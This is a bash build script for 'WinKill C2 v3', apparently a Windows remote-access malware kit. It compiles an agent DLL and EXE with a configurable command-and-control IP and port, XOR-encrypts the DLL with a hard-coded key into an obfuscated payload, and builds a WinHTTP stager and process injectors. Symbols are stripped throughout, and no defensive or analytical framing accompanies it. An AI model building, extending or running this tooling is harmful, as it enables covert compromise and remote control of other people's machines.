#!/bin/bash
# WinKill C2 v3 Builder (Linux cross-compile)
# Usage: ./build.sh [IP] [PORT]
IP="${1:-192.168.102.167}"; PORT="${2:-4444}"
IPHEX=$(python3 -c "import socket,struct;print(hex(struct.unpack('<I',socket.inet_aton('$IP'))[0]))" 2>/dev/null || python -c "import socket,struct;print(hex(struct.unpack('<I',socket.inet_aton('$IP'))[0]))")
GCC="${GCC:-x86_64-w64-mingw32-gcc}"
echo "============================================"
echo "  WinKill C2 v3 Builder"
echo "  C2: $IP:$PORT  (hex: $IPHEX)"
echo "============================================"
set -e
echo "[1/7] agent.dll..."
$GCC -O2 -s -m64 -shared -fno-ident -DC2_IP=$IPHEX -DC2_PORT=$PORT -o agent.dll agent_source.c -lws2_32 -lwldap32 -ladvapi32 -lnetapi32
echo "[2/7] encrypt.exe..."
$GCC -O2 -s -m64 -fno-ident -o encrypt.exe encrypt_source.c
echo "[3/7] agent.dll.enc + payload.bin..."
wine ./encrypt.exe agent.dll 2>/dev/null || ./encrypt.exe agent.dll 2>/dev/null || python3 -c "d=open('agent.dll','rb').read();k=bytes([0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB]);open('agent.dll.enc','wb').write(bytes(b^k[i%16] for i,b in enumerate(d)));open('payload.bin','wb').write(bytes(b^k[i%16] for i,b in enumerate(d)))"
cp agent.dll.enc payload.bin 2>/dev/null || true
echo "[4/7] stager.exe..."
$GCC -O2 -s -m64 -fno-ident -o stager.exe stager.c -lwinhttp
echo "[5/7] injector.exe..."
$GCC -O2 -s -m64 -fno-ident -o injector.exe injector_source.c
echo "[6/7] injector_enc.exe..."
$GCC -O2 -s -m64 -fno-ident -o injector_enc.exe injector_enc_source.c
echo "[7/7] agent.exe..."
$GCC -O2 -s -m64 -fno-ident -DC2_IP=$IPHEX -DC2_PORT=$PORT -o agent.exe agent_exe_source.c -lws2_32 -lwldap32 -ladvapi32 -lnetapi32
echo ""
echo "Done!"
ls -la agent.dll agent.dll.enc payload.bin stager.exe agent.exe c2_server.py
